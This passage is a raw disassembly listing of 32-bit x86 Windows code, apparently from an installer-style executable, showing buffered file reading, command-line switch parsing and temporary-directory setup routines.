  4032b5:	b8 50 a0 40 00       	mov    $0x40a050,%eax
  4032ba:	eb 51                	jmp    0x40330d
  4032bc:	6a 01                	push   $0x1
  4032be:	e8 82 fd ff ff       	call   0x403045
  4032c3:	59                   	pop    %ecx
  4032c4:	eb ef                	jmp    0x4032b5
  4032c6:	f6 45 d8 01          	testb  $0x1,-0x28(%ebp)
  4032ca:	89 35 10 47 43 00    	mov    %esi,0x434710
  4032d0:	8b 06                	mov    (%esi),%eax
  4032d2:	a3 18 47 43 00       	mov    %eax,0x434718
  4032d7:	74 06                	je     0x4032df
  4032d9:	ff 05 1c 47 43 00    	incl   0x43471c
  4032df:	6a 08                	push   $0x8
  4032e1:	8d 46 44             	lea    0x44(%esi),%eax
  4032e4:	59                   	pop    %ecx
  4032e5:	83 e8 08             	sub    $0x8,%eax
  4032e8:	01 30                	add    %esi,(%eax)
  4032ea:	49                   	dec    %ecx
  4032eb:	75 f8                	jne    0x4032e5
  4032ed:	6a 01                	push   $0x1
  4032ef:	57                   	push   %edi
  4032f0:	57                   	push   %edi
  4032f1:	53                   	push   %ebx
  4032f2:	ff 15 34 81 40 00    	call   *0x408134
  4032f8:	89 46 3c             	mov    %eax,0x3c(%esi)
  4032fb:	83 c6 04             	add    $0x4,%esi
  4032fe:	6a 40                	push   $0x40
  403300:	56                   	push   %esi
  403301:	68 20 47 43 00       	push   $0x434720
  403306:	e8 52 2d 00 00       	call   0x40605d
  40330b:	33 c0                	xor    %eax,%eax
  40330d:	5f                   	pop    %edi
  40330e:	5e                   	pop    %esi
  40330f:	5b                   	pop    %ebx
  403310:	c9                   	leave
  403311:	c2 04 00             	ret    $0x4
  403314:	55                   	push   %ebp
  403315:	8b ec                	mov    %esp,%ebp
  403317:	81 ec 94 00 00 00    	sub    $0x94,%esp
  40331d:	53                   	push   %ebx
  40331e:	56                   	push   %esi
  40331f:	8b 75 14             	mov    0x14(%ebp),%esi
  403322:	57                   	push   %edi
  403323:	8b 7d 10             	mov    0x10(%ebp),%edi
  403326:	89 75 f8             	mov    %esi,-0x8(%ebp)
  403329:	85 ff                	test   %edi,%edi
  40332b:	75 07                	jne    0x403334
  40332d:	c7 45 f8 00 80 00 00 	movl   $0x8000,-0x8(%ebp)
  403334:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  403338:	89 7d f4             	mov    %edi,-0xc(%ebp)
  40333b:	85 ff                	test   %edi,%edi
  40333d:	75 07                	jne    0x403346
  40333f:	c7 45 f4 20 2a 42 00 	movl   $0x422a20,-0xc(%ebp)
  403346:	8b 45 08             	mov    0x8(%ebp),%eax
  403349:	85 c0                	test   %eax,%eax
  40334b:	7c 0e                	jl     0x40335b
  40334d:	8b 0d 58 47 43 00    	mov    0x434758,%ecx
  403353:	03 c8                	add    %eax,%ecx
  403355:	51                   	push   %ecx
  403356:	e8 ea 01 00 00       	call   0x403545
  40335b:	8d 45 14             	lea    0x14(%ebp),%eax
  40335e:	6a 04                	push   $0x4
  403360:	50                   	push   %eax
  403361:	e8 c9 01 00 00       	call   0x40352f
  403366:	85 c0                	test   %eax,%eax
  403368:	0f 84 af 01 00 00    	je     0x40351d
  40336e:	f6 45 17 80          	testb  $0x80,0x17(%ebp)
  403372:	0f 84 50 01 00 00    	je     0x4034c8
  403378:	8b 1d d0 80 40 00    	mov    0x4080d0,%ebx
  40337e:	ff d3                	call   *%ebx
  403380:	83 25 84 d3 40 00 00 	andl   $0x0,0x40d384
  403387:	83 25 80 d3 40 00 00 	andl   $0x0,0x40d380
  40338e:	81 65 14 ff ff ff 7f 	andl   $0x7fffffff,0x14(%ebp)
  403395:	89 45 f0             	mov    %eax,-0x10(%ebp)
  403398:	b8 08 ea 40 00       	mov    $0x40ea08,%eax
  40339d:	c7 05 68 ce 40 00 08 	movl   $0x8,0x40ce68
  4033a4:	00 00 00 
  4033a7:	a3 10 6a 41 00       	mov    %eax,0x416a10
  4033ac:	a3 0c 6a 41 00       	mov    %eax,0x416a0c
  4033b1:	8b 45 14             	mov    0x14(%ebp),%eax
  4033b4:	c7 05 08 6a 41 00 08 	movl   $0x416a08,0x416a08
  4033bb:	6a 41 00 
  4033be:	89 45 08             	mov    %eax,0x8(%ebp)
  4033c1:	0f 8e 5e 01 00 00    	jle    0x403525
  4033c7:	be 00 40 00 00       	mov    $0x4000,%esi
  4033cc:	39 75 14             	cmp    %esi,0x14(%ebp)
  4033cf:	7d 03                	jge    0x4033d4
  4033d1:	8b 75 14             	mov    0x14(%ebp),%esi
  4033d4:	bf 20 ea 41 00       	mov    $0x41ea20,%edi
  4033d9:	56                   	push   %esi
  4033da:	57                   	push   %edi
  4033db:	e8 4f 01 00 00       	call   0x40352f
  4033e0:	85 c0                	test   %eax,%eax
  4033e2:	0f 84 35 01 00 00    	je     0x40351d
  4033e8:	29 75 14             	sub    %esi,0x14(%ebp)
  4033eb:	89 3d 58 ce 40 00    	mov    %edi,0x40ce58
  4033f1:	89 35 5c ce 40 00    	mov    %esi,0x40ce5c
  4033f7:	8b 7d f4             	mov    -0xc(%ebp),%edi
  4033fa:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4033fd:	68 58 ce 40 00       	push   $0x40ce58
  403402:	89 3d 60 ce 40 00    	mov    %edi,0x40ce60
  403408:	a3 64 ce 40 00       	mov    %eax,0x40ce64
  40340d:	e8 ef 36 00 00       	call   0x406b01
  403412:	85 c0                	test   %eax,%eax
  403414:	89 45 ec             	mov    %eax,-0x14(%ebp)
  403417:	0f 8c a3 00 00 00    	jl     0x4034c0
  40341d:	8b 35 60 ce 40 00    	mov    0x40ce60,%esi
  403423:	2b f7                	sub    %edi,%esi
  403425:	ff d3                	call   *%ebx
  403427:	f6 05 b4 47 43 00 01 	testb  $0x1,0x4347b4
  40342e:	8b f8                	mov    %eax,%edi
  403430:	74 49                	je     0x40347b
  403432:	2b 45 f0             	sub    -0x10(%ebp),%eax
  403435:	3d c8 00 00 00       	cmp    $0xc8,%eax
  40343a:	77 06                	ja     0x403442
  40343c:	83 7d 14 00          	cmpl   $0x0,0x14(%ebp)
  403440:	75 39                	jne    0x40347b
  403442:	8b 45 08             	mov    0x8(%ebp),%eax
  403445:	ff 75 08             	push   0x8(%ebp)
  403448:	2b 45 14             	sub    0x14(%ebp),%eax
  40344b:	6a 64                	push   $0x64
  40344d:	50                   	push   %eax
  40344e:	ff 15 48 81 40 00    	call   *0x408148
  403454:	50                   	push   %eax
  403455:	8d 85 6c ff ff ff    	lea    -0x94(%ebp),%eax
  40345b:	68 1c a2 40 00       	push   $0x40a21c
  403460:	50                   	push   %eax
  403461:	ff 15 2c 82 40 00    	call   *0x40822c
  403467:	83 c4 0c             	add    $0xc,%esp
  40346a:	8d 85 6c ff ff ff    	lea    -0x94(%ebp),%eax
  403470:	50                   	push   %eax
  403471:	6a 00                	push   $0x0
  403473:	e8 bf 21 00 00       	call   0x405637
  403478:	89 7d f0             	mov    %edi,-0x10(%ebp)
  40347b:	85 f6                	test   %esi,%esi
  40347d:	74 35                	je     0x4034b4
  40347f:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  403483:	75 15                	jne    0x40349a
  403485:	56                   	push   %esi
  403486:	ff 75 f4             	push   -0xc(%ebp)
  403489:	ff 75 0c             	push   0xc(%ebp)
  40348c:	e8 c3 2c 00 00       	call   0x406154
  403491:	85 c0                	test   %eax,%eax
  403493:	74 2f                	je     0x4034c4
  403495:	01 75 fc             	add    %esi,-0x4(%ebp)
  403498:	eb 0e                	jmp    0x4034a8
  40349a:	a1 60 ce 40 00       	mov    0x40ce60,%eax
  40349f:	01 75 fc             	add    %esi,-0x4(%ebp)
  4034a2:	29 75 f8             	sub    %esi,-0x8(%ebp)
  4034a5:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4034a8:	83 7d ec 01          	cmpl   $0x1,-0x14(%ebp)
  4034ac:	0f 85 45 ff ff ff    	jne    0x4033f7
  4034b2:	eb 71                	jmp    0x403525
  4034b4:	83 7d 14 00          	cmpl   $0x0,0x14(%ebp)
  4034b8:	0f 8f 09 ff ff ff    	jg     0x4033c7
  4034be:	eb 65                	jmp    0x403525
  4034c0:	6a fc                	push   $0xfffffffc
  4034c2:	eb 5b                	jmp    0x40351f
  4034c4:	6a fe                	push   $0xfffffffe
  4034c6:	eb 57                	jmp    0x40351f
  4034c8:	85 ff                	test   %edi,%edi
  4034ca:	75 3e                	jne    0x40350a
  4034cc:	39 7d 14             	cmp    %edi,0x14(%ebp)
  4034cf:	7e 54                	jle    0x403525
  4034d1:	8b 5d f8             	mov    -0x8(%ebp),%ebx
  4034d4:	39 5d 14             	cmp    %ebx,0x14(%ebp)
  4034d7:	8b 75 14             	mov    0x14(%ebp),%esi
  4034da:	7c 02                	jl     0x4034de
  4034dc:	8b f3                	mov    %ebx,%esi
  4034de:	bf 20 ea 41 00       	mov    $0x41ea20,%edi
  4034e3:	56                   	push   %esi
  4034e4:	57                   	push   %edi
  4034e5:	e8 45 00 00 00       	call   0x40352f
  4034ea:	85 c0                	test   %eax,%eax
  4034ec:	74 2f                	je     0x40351d
  4034ee:	56                   	push   %esi
  4034ef:	57                   	push   %edi
  4034f0:	ff 75 0c             	push   0xc(%ebp)
  4034f3:	e8 5c 2c 00 00       	call   0x406154
  4034f8:	85 c0                	test   %eax,%eax
  4034fa:	74 c8                	je     0x4034c4
  4034fc:	01 75 fc             	add    %esi,-0x4(%ebp)
  4034ff:	29 75 14             	sub    %esi,0x14(%ebp)
  403502:	83 7d 14 00          	cmpl   $0x0,0x14(%ebp)
  403506:	7f cc                	jg     0x4034d4
  403508:	eb 1b                	jmp    0x403525
  40350a:	39 75 14             	cmp    %esi,0x14(%ebp)
  40350d:	7d 03                	jge    0x403512
  40350f:	8b 75 14             	mov    0x14(%ebp),%esi
  403512:	56                   	push   %esi
  403513:	57                   	push   %edi
  403514:	e8 16 00 00 00       	call   0x40352f
  403519:	85 c0                	test   %eax,%eax
  40351b:	75 05                	jne    0x403522
  40351d:	6a fd                	push   $0xfffffffd
  40351f:	58                   	pop    %eax
  403520:	eb 06                	jmp    0x403528
  403522:	89 75 fc             	mov    %esi,-0x4(%ebp)
  403525:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403528:	5f                   	pop    %edi
  403529:	5e                   	pop    %esi
  40352a:	5b                   	pop    %ebx
  40352b:	c9                   	leave
  40352c:	c2 10 00             	ret    $0x10
  40352f:	ff 74 24 08          	push   0x8(%esp)
  403533:	ff 74 24 08          	push   0x8(%esp)
  403537:	ff 35 18 a0 40 00    	push   0x40a018
  40353d:	e8 e3 2b 00 00       	call   0x406125
  403542:	c2 08 00             	ret    $0x8
  403545:	6a 00                	push   $0x0
  403547:	6a 00                	push   $0x0
  403549:	ff 74 24 0c          	push   0xc(%esp)
  40354d:	ff 35 18 a0 40 00    	push   0x40a018
  403553:	ff 15 34 81 40 00    	call   *0x408134
  403559:	c2 04 00             	ret    $0x4
  40355c:	56                   	push   %esi
  40355d:	be 00 18 44 00       	mov    $0x441800,%esi
  403562:	56                   	push   %esi
  403563:	e8 f8 32 00 00       	call   0x406860
  403568:	56                   	push   %esi
  403569:	e8 8a 29 00 00       	call   0x405ef8
  40356e:	85 c0                	test   %eax,%eax
  403570:	75 02                	jne    0x403574
  403572:	5e                   	pop    %esi
  403573:	c3                   	ret
  403574:	56                   	push   %esi
  403575:	e8 07 29 00 00       	call   0x405e81
  40357a:	56                   	push   %esi
  40357b:	e8 e0 25 00 00       	call   0x405b60
  403580:	56                   	push   %esi
  403581:	68 00 10 44 00       	push   $0x441000
  403586:	e8 46 2b 00 00       	call   0x4060d1
  40358b:	5e                   	pop    %esi
  40358c:	c3                   	ret
  40358d:	81 ec f8 03 00 00    	sub    $0x3f8,%esp
  403593:	55                   	push   %ebp
  403594:	56                   	push   %esi
  403595:	57                   	push   %edi
  403596:	6a 20                	push   $0x20
  403598:	5f                   	pop    %edi
  403599:	33 ed                	xor    %ebp,%ebp
  40359b:	68 01 80 00 00       	push   $0x8001
  4035a0:	89 6c 24 20          	mov    %ebp,0x20(%esp)
  4035a4:	c7 44 24 18 d8 a2 40 	movl   $0x40a2d8,0x18(%esp)
  4035ab:	00 
  4035ac:	89 6c 24 14          	mov    %ebp,0x14(%esp)
  4035b0:	ff 15 a0 80 40 00    	call   *0x4080a0
  4035b6:	8b 35 a4 80 40 00    	mov    0x4080a4,%esi
  4035bc:	8d 44 24 34          	lea    0x34(%esp),%eax
  4035c0:	50                   	push   %eax
  4035c1:	89 6c 24 4c          	mov    %ebp,0x4c(%esp)
  4035c5:	89 ac 24 4c 01 00 00 	mov    %ebp,0x14c(%esp)
  4035cc:	89 ac 24 50 01 00 00 	mov    %ebp,0x150(%esp)
  4035d3:	c7 44 24 38 1c 01 00 	movl   $0x11c,0x38(%esp)
  4035da:	00 
  4035db:	ff d6                	call   *%esi
  4035dd:	85 c0                	test   %eax,%eax
  4035df:	75 38                	jne    0x403619
  4035e1:	8d 44 24 34          	lea    0x34(%esp),%eax
  4035e5:	c7 44 24 34 14 01 00 	movl   $0x114,0x34(%esp)
  4035ec:	00 
  4035ed:	50                   	push   %eax
  4035ee:	ff d6                	call   *%esi
  4035f0:	66 8b 44 24 48       	mov    0x48(%esp),%ax
  4035f5:	8b 4c 24 62          	mov    0x62(%esp),%ecx
  4035f9:	66 2d 53 00          	sub    $0x53,%ax
  4035fd:	83 c1 d0             	add    $0xffffffd0,%ecx
  403600:	66 f7 d8             	neg    %ax
  403603:	1b c0                	sbb    %eax,%eax
  403605:	c6 84 24 4e 01 00 00 	movb   $0x4,0x14e(%esp)
  40360c:	04 
  40360d:	f7 d0                	not    %eax
  40360f:	23 c1                	and    %ecx,%eax
  403611:	66 89 84 24 48 01 00 	mov    %ax,0x148(%esp)
  403618:	00 
  403619:	83 7c 24 38 0a       	cmpl   $0xa,0x38(%esp)
  40361e:	73 06                	jae    0x403626
  403620:	66 83 64 24 42 00    	andw   $0x0,0x42(%esp)
  403626:	8b 44 24 40          	mov    0x40(%esp),%eax
  40362a:	0f b6 4c 24 3c       	movzbl 0x3c(%esp),%ecx
  40362f:	a3 b8 47 43 00       	mov    %eax,0x4347b8
  403634:	33 c0                	xor    %eax,%eax
  403636:	8a 64 24 38          	mov    0x38(%esp),%ah
  40363a:	0f b7 c0             	movzwl %ax,%eax
  40363d:	0b c1                	or     %ecx,%eax
  40363f:	33 c9                	xor    %ecx,%ecx
  403641:	8a ac 24 48 01 00 00 	mov    0x148(%esp),%ch
  403648:	0f b7 c9             	movzwl %cx,%ecx
  40364b:	c1 e0 10             	shl    $0x10,%eax
  40364e:	0b c1                	or     %ecx,%eax
  403650:	0f b6 8c 24 4e 01 00 	movzbl 0x14e(%esp),%ecx
  403657:	00 
  403658:	0b c1                	or     %ecx,%eax
  40365a:	a3 bc 47 43 00       	mov    %eax,0x4347bc
  40365f:	66 81 3d be 47 43 00 	cmpw   $0x600,0x4347be
  403666:	00 06 
  403668:	74 11                	je     0x40367b
  40366a:	55                   	push   %ebp
  40366b:	e8 36 33 00 00       	call   0x4069a6
  403670:	3b c5                	cmp    %ebp,%eax
  403672:	74 07                	je     0x40367b
  403674:	68 00 0c 00 00       	push   $0xc00
  403679:	ff d0                	call   *%eax
  40367b:	be a8 82 40 00       	mov    $0x4082a8,%esi
  403680:	56                   	push   %esi
  403681:	e8 b0 32 00 00       	call   0x406936
  403686:	56                   	push   %esi
  403687:	ff 15 28 81 40 00    	call   *0x408128
  40368d:	8d 74 06 01          	lea    0x1(%esi,%eax,1),%esi
  403691:	80 3e 00             	cmpb   $0x0,(%esi)
  403694:	75 ea                	jne    0x403680
  403696:	6a 0c                	push   $0xc
  403698:	e8 09 33 00 00       	call   0x4069a6
  40369d:	6a 0a                	push   $0xa
  40369f:	e8 02 33 00 00       	call   0x4069a6
  4036a4:	6a 08                	push   $0x8
  4036a6:	a3 04 47 43 00       	mov    %eax,0x434704
  4036ab:	e8 f6 32 00 00       	call   0x4069a6
  4036b0:	3b c5                	cmp    %ebp,%eax
  4036b2:	74 0f                	je     0x4036c3
  4036b4:	6a 1e                	push   $0x1e
  4036b6:	ff d0                	call   *%eax
  4036b8:	85 c0                	test   %eax,%eax
  4036ba:	74 07                	je     0x4036c3
  4036bc:	80 0d bc 47 43 00 80 	orb    $0x80,0x4347bc
  4036c3:	53                   	push   %ebx
  4036c4:	ff 15 38 80 40 00    	call   *0x408038
  4036ca:	55                   	push   %ebp
  4036cb:	ff 15 98 82 40 00    	call   *0x408298
  4036d1:	a3 c0 47 43 00       	mov    %eax,0x4347c0
  4036d6:	55                   	push   %ebp
  4036d7:	8d 84 24 58 01 00 00 	lea    0x158(%esp),%eax
  4036de:	68 b4 02 00 00       	push   $0x2b4
  4036e3:	50                   	push   %eax
  4036e4:	55                   	push   %ebp
  4036e5:	68 28 aa 42 00       	push   $0x42aa28
  4036ea:	ff 15 7c 81 40 00    	call   *0x40817c
  4036f0:	68 bc a2 40 00       	push   $0x40a2bc
  4036f5:	68 00 37 43 00       	push   $0x433700
  4036fa:	e8 b3 2e 00 00       	call   0x4065b2
  4036ff:	ff 15 a8 80 40 00    	call   *0x4080a8
  403705:	bb 00 f0 43 00       	mov    $0x43f000,%ebx
  40370a:	50                   	push   %eax
  40370b:	53                   	push   %ebx
  40370c:	e8 a1 2e 00 00       	call   0x4065b2
  403711:	6a 22                	push   $0x22
  403713:	c7 05 00 47 43 00 00 	movl   $0x400000,0x434700
  40371a:	00 40 00 
  40371d:	5e                   	pop    %esi
  40371e:	8b c3                	mov    %ebx,%eax
  403720:	66 39 35 00 f0 43 00 	cmp    %si,0x43f000
  403727:	75 07                	jne    0x403730
  403729:	8b fe                	mov    %esi,%edi
  40372b:	b8 02 f0 43 00       	mov    $0x43f002,%eax
  403730:	57                   	push   %edi
  403731:	50                   	push   %eax
  403732:	e8 77 27 00 00       	call   0x405eae
  403737:	50                   	push   %eax
  403738:	ff 15 08 82 40 00    	call   *0x408208
  40373e:	8b c8                	mov    %eax,%ecx
  403740:	89 4c 24 1c          	mov    %ecx,0x1c(%esp)
  403744:	e9 f6 00 00 00       	jmp    0x40383f
  403749:	6a 20                	push   $0x20
  40374b:	5a                   	pop    %edx
  40374c:	66 3b c2             	cmp    %dx,%ax
  40374f:	75 07                	jne    0x403758
  403751:	41                   	inc    %ecx
  403752:	41                   	inc    %ecx
  403753:	66 39 11             	cmp    %dx,(%ecx)
  403756:	74 f9                	je     0x403751
  403758:	66 39 31             	cmp    %si,(%ecx)
  40375b:	89 54 24 10          	mov    %edx,0x10(%esp)
  40375f:	75 06                	jne    0x403767
  403761:	41                   	inc    %ecx
  403762:	89 74 24 10          	mov    %esi,0x10(%esp)
  403766:	41                   	inc    %ecx
  403767:	66 83 39 2f          	cmpw   $0x2f,(%ecx)
  40376b:	0f 85 bb 00 00 00    	jne    0x40382c
  403771:	41                   	inc    %ecx
  403772:	41                   	inc    %ecx
  403773:	66 83 39 53          	cmpw   $0x53,(%ecx)
  403777:	75 18                	jne    0x403791
  403779:	66 8b 41 02          	mov    0x2(%ecx),%ax
  40377d:	66 3b c2             	cmp    %dx,%ax
  403780:	74 05                	je     0x403787
  403782:	66 3b c5             	cmp    %bp,%ax
  403785:	75 0a                	jne    0x403791
  403787:	c7 05 a0 47 43 00 01 	movl   $0x1,0x4347a0
  40378e:	00 00 00 
  403791:	0f b7 05 b6 a2 40 00 	movzwl 0x40a2b6,%eax
  403798:	99                   	cltd
  403799:	0f a4 c2 10          	shld   $0x10,%eax,%edx
  40379d:	c1 e0 10             	shl    $0x10,%eax
  4037a0:	8b f8                	mov    %eax,%edi
  4037a2:	33 f6                	xor    %esi,%esi
  4037a4:	0f b7 05 b4 a2 40 00 	movzwl 0x40a2b4,%eax
  4037ab:	99                   	cltd
  4037ac:	0f b7 15 b0 a2 40 00 	movzwl 0x40a2b0,%edx
  4037b3:	0b f8                	or     %eax,%edi
  4037b5:	0f b7 05 b2 a2 40 00 	movzwl 0x40a2b2,%eax
  4037bc:	c1 e0 10             	shl    $0x10,%eax
  4037bf:	0b c2                	or     %edx,%eax
  4037c1:	99                   	cltd
  4037c2:	0b f0                	or     %eax,%esi
  4037c4:	8b 01                	mov    (%ecx),%eax
  4037c6:	0b fa                	or     %edx,%edi
  4037c8:	3b c6                	cmp    %esi,%eax
  4037ca:	75 1b                	jne    0x4037e7
  4037cc:	8b 41 04             	mov    0x4(%ecx),%eax
  4037cf:	3b c7                	cmp    %edi,%eax
  4037d1:	75 14                	jne    0x4037e7
  4037d3:	66 8b 41 08          	mov    0x8(%ecx),%ax
  4037d7:	66 3d 20 00          	cmp    $0x20,%ax
  4037db:	74 05                	je     0x4037e2
  4037dd:	66 3b c5             	cmp    %bp,%ax
  4037e0:	75 05                	jne    0x4037e7
  4037e2:	83 4c 24 14 04       	orl    $0x4,0x14(%esp)
  4037e7:	0f b7 05 aa a2 40 00 	movzwl 0x40a2aa,%eax
  4037ee:	99                   	cltd
  4037ef:	0f a4 c2 10          	shld   $0x10,%eax,%edx
  4037f3:	c1 e0 10             	shl    $0x10,%eax
  4037f6:	8b f8                	mov    %eax,%edi
  4037f8:	33 f6                	xor    %esi,%esi
  4037fa:	0f b7 05 a8 a2 40 00 	movzwl 0x40a2a8,%eax
  403801:	99                   	cltd
  403802:	0f b7 15 a4 a2 40 00 	movzwl 0x40a2a4,%edx
  403809:	0b f8                	or     %eax,%edi
  40380b:	0f b7 05 a6 a2 40 00 	movzwl 0x40a2a6,%eax
  403812:	c1 e0 10             	shl    $0x10,%eax
  403815:	0b c2                	or     %edx,%eax
  403817:	99                   	cltd
  403818:	0b f0                	or     %eax,%esi
  40381a:	8b 41 fc             	mov    -0x4(%ecx),%eax
  40381d:	0b fa                	or     %edx,%edi
  40381f:	3b c6                	cmp    %esi,%eax
  403821:	75 06                	jne    0x403829
  403823:	8b 01                	mov    (%ecx),%eax
  403825:	3b c7                	cmp    %edi,%eax
  403827:	74 24                	je     0x40384d
  403829:	6a 22                	push   $0x22
  40382b:	5e                   	pop    %esi
  40382c:	ff 74 24 10          	push   0x10(%esp)
  403830:	51                   	push   %ecx
  403831:	e8 78 26 00 00       	call   0x405eae
  403836:	8b c8                	mov    %eax,%ecx
  403838:	66 39 31             	cmp    %si,(%ecx)
  40383b:	75 02                	jne    0x40383f
  40383d:	41                   	inc    %ecx
  40383e:	41                   	inc    %ecx
  40383f:	66 8b 01             	mov    (%ecx),%ax
  403842:	66 3b c5             	cmp    %bp,%ax
  403845:	0f 85 fe fe ff ff    	jne    0x403749
  40384b:	eb 12                	jmp    0x40385f
  40384d:	66 89 69 fc          	mov    %bp,-0x4(%ecx)
  403851:	83 c1 04             	add    $0x4,%ecx
  403854:	51                   	push   %ecx
  403855:	68 00 f8 43 00       	push   $0x43f800
  40385a:	e8 53 2d 00 00       	call   0x4065b2
  40385f:	8b 3d ac 80 40 00    	mov    0x4080ac,%edi
  403865:	be 00 18 44 00       	mov    $0x441800,%esi
  40386a:	56                   	push   %esi
  40386b:	68 00 04 00 00       	push   $0x400
  403870:	ff d7                	call   *%edi
  403872:	e8 e5 fc ff ff       	call   0x40355c
  403877:	85 c0                	test   %eax,%eax
  403879:	75 56                	jne    0x4038d1
  40387b:	68 fb 03 00 00       	push   $0x3fb
  403880:	56                   	push   %esi
  403881:	ff 15 b0 80 40 00    	call   *0x4080b0
  403887:	68 98 a2 40 00       	push   $0x40a298
  40388c:	56                   	push   %esi
  40388d:	e8 3c 2d 00 00       	call   0x4065ce
  403892:	e8 c5 fc ff ff       	call   0x40355c
  403897:	85 c0                	test   %eax,%eax
  403899:	75 36                	jne    0x4038d1
  40389b:	56                   	push   %esi
  40389c:	68 fc 03 00 00       	push   $0x3fc
  4038a1:	ff d7                	call   *%edi
  4038a3:	68 90 a2 40 00       	push   $0x40a290
  4038a8:	56                   	push   %esi
  4038a9:	e8 20 2d 00 00       	call   0x4065ce
  4038ae:	8b 3d b4 80 40 00    	mov    0x4080b4,%edi
  4038b4:	56                   	push   %esi
  4038b5:	68 84 a2 40 00       	push   $0x40a284
  4038ba:	ff d7                	call   *%edi
  4038bc:	56                   	push   %esi
  4038bd:	68 7c a2 40 00       	push   $0x40a27c
  4038c2:	ff d7                	call   *%edi
  4038c4:	e8 93 fc ff ff       	call   0x40355c
  4038c9:	85 c0                	test   %eax,%eax
  4038cb:	0f 84 07 02 00 00    	je     0x403ad8
  4038d1:	68 00 10 44 00       	push   $0x441000
  4038d6:	ff 15 44 81 40 00    	call   *0x408144
  4038dc:	ff 74 24 14          	push   0x14(%esp)
  4038e0:	e8 c4 f7 ff ff       	call   0x4030a9
  4038e5:	3b c5                	cmp    %ebp,%eax
  4038e7:	89 44 24 18          	mov    %eax,0x18(%esp)
  4038eb:	0f 85 e7 01 00 00    	jne    0x403ad8
  4038f1:	39 2d 1c 47 43 00    	cmp    %ebp,0x43471c
  4038f7:	0f 84 93 00 00 00    	je     0x403990
  4038fd:	55                   	push   %ebp
  4038fe:	53                   	push   %ebx
  4038ff:	e8 aa 25 00 00       	call   0x405eae
  403904:	8b f8                	mov    %eax,%edi
  403906:	3b fb                	cmp    %ebx,%edi
  403908:	72 4c                	jb     0x403956
  40390a:	0f b7 05 76 a2 40 00 	movzwl 0x40a276,%eax
  403911:	99                   	cltd
  403912:	0f a4 c2 10          	shld   $0x10,%eax,%edx
  403916:	c1 e0 10             	shl    $0x10,%eax
  403919:	8b e8                	mov    %eax,%ebp
  40391b:	0f b7 05 74 a2 40 00 	movzwl 0x40a274,%eax
  403922:	0f b7 0d 70 a2 40 00 	movzwl 0x40a270,%ecx
  403929:	99                   	cltd
  40392a:	0b e8                	or     %eax,%ebp
  40392c:	0f b7 05 72 a2 40 00 	movzwl 0x40a272,%eax
  403933:	c1 e0 10             	shl    $0x10,%eax
  403936:	0b c1                	or     %ecx,%eax
  403938:	33 c9                	xor    %ecx,%ecx
  40393a:	99                   	cltd
  40393b:	0b c8                	or     %eax,%ecx
  40393d:	8b c5                	mov    %ebp,%eax
  40393f:	0b c2                	or     %edx,%eax
  403941:	8b 17                	mov    (%edi),%edx
  403943:	3b d1                	cmp    %ecx,%edx
  403945:	75 07                	jne    0x40394e
  403947:	8b 57 04             	mov    0x4(%edi),%edx
  40394a:	3b d0                	cmp    %eax,%edx
  40394c:	74 06                	je     0x403954
  40394e:	4f                   	dec    %edi
  40394f:	4f                   	dec    %edi
  403950:	3b fb                	cmp    %ebx,%edi
  403952:	73 ed                	jae    0x403941
  403954:	33 ed                	xor    %ebp,%ebp
  403956:	3b fb                	cmp    %ebx,%edi
  403958:	c7 44 24 18 e8 a1 40 	movl   $0x40a1e8,0x18(%esp)
  40395f:	00 
  403960:	72 43                	jb     0x4039a5
  403962:	66 89 2f             	mov    %bp,(%edi)
  403965:	83 c7 08             	add    $0x8,%edi
  403968:	57                   	push   %edi
  403969:	e8 1b 26 00 00       	call   0x405f89
  40396e:	85 c0                	test   %eax,%eax
  403970:	0f 84 62 01 00 00    	je     0x403ad8
  403976:	57                   	push   %edi
  403977:	68 00 f8 43 00       	push   $0x43f800
  40397c:	e8 31 2c 00 00       	call   0x4065b2
  403981:	57                   	push   %edi
  403982:	68 00 00 44 00       	push   $0x440000
  403987:	e8 26 2c 00 00       	call   0x4065b2
  40398c:	89 6c 24 18          	mov    %ebp,0x18(%esp)
  403990:	83 0d ac 47 43 00 ff 	orl    $0xffffffff,0x4347ac
  403997:	e8 e8 02 00 00       	call   0x403c84
  40399c:	89 44 24 20          	mov    %eax,0x20(%esp)
  4039a0:	e9 33 01 00 00       	jmp    0x403ad8
  4039a5:	e8 d3 21 00 00       	call   0x405b7d
  4039aa:	56                   	push   %esi
  4039ab:	89 44 24 28          	mov    %eax,0x28(%esp)
  4039af:	e8 14 2c 00 00       	call   0x4065c8
  4039b4:	ff 74 24 1c          	push   0x1c(%esp)
  4039b8:	8b f8                	mov    %eax,%edi
  4039ba:	68 00 50 43 00       	push   $0x435000
  4039bf:	e8 ee 2b 00 00       	call   0x4065b2
  4039c4:	66 39 2d 00 f8 43 00 	cmp    %bp,0x43f800
  4039cb:	75 0f                	jne    0x4039dc
  4039cd:	68 00 08 44 00       	push   $0x440800
  4039d2:	68 00 f8 43 00       	push   $0x43f800
  4039d7:	e8 d6 2b 00 00       	call   0x4065b2
  4039dc:	8d 04 7d 00 18 44 00 	lea    0x441800(,%edi,2),%eax
  4039e3:	c7 44 24 14 01 00 00 	movl   $0x1,0x14(%esp)
  4039ea:	00 
  4039eb:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  4039ef:	bf 00 78 43 00       	mov    $0x437800,%edi
  4039f4:	bb 00 80 43 00       	mov    $0x438000,%ebx
  4039f9:	89 6c 24 10          	mov    %ebp,0x10(%esp)
  4039fd:	0f b7 6c 24 14       	movzwl 0x14(%esp),%ebp
  403a02:	55                   	push   %ebp
  403a03:	68 58 a2 40 00       	push   $0x40a258
  403a08:	ff 74 24 24          	push   0x24(%esp)
  403a0c:	ff 15 2c 82 40 00    	call   *0x40822c
  403a12:	a1 10 47 43 00       	mov    0x434710,%eax
  403a17:	83 c4 0c             	add    $0xc,%esp
  403a1a:	ff b0 20 01 00 00    	push   0x120(%eax)
  403a20:	57                   	push   %edi
  403a21:	e8 c9 2b 00 00       	call   0x4065ef
  403a26:	83 7c 24 24 00       	cmpl   $0x0,0x24(%esp)
  403a2b:	56                   	push   %esi
  403a2c:	74 07                	je     0x403a35
  403a2e:	e8 d3 20 00 00       	call   0x405b06
  403a33:	eb 05                	jmp    0x403a3a
  403a35:	e8 26 21 00 00       	call   0x405b60
  403a3a:	85 c0                	test   %eax,%eax
  403a3c:	74 3a                	je     0x403a78
  403a3e:	57                   	push   %edi
